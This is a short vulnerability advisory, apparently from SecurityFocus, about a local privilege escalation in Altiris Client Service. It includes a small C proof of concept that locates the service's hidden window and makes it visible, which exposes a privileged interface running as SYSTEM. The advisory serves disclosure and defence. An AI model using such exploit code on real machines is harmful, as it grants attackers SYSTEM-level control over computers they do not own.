source: http://www.securityfocus.com/bid/13409/info

A local privilege escalation vulnerability affects the Altiris Client Service. This issue is due to a failure of the application to properly secure access to privileged interfaces.

An attacker may leverage this issue to gain SYSTEM level privileges on an affected computer. 

#include <stdio.h>
#include <windows.h>

int main( void )
{
        HWND hWnd;
        char szWindowName[] = "Altiris Client Service";

        printf( "Finding window %s\n", szWindowName );

        hWnd = FindWindow( NULL, szWindowName );

        if ( hWnd == NULL )
        {
                printf( "ERROR! Could not find window %s\n", szWindowName );

                exit( 1 );
        }

        ShowWindow( hWnd, SW_SHOW );

        return 0;
}
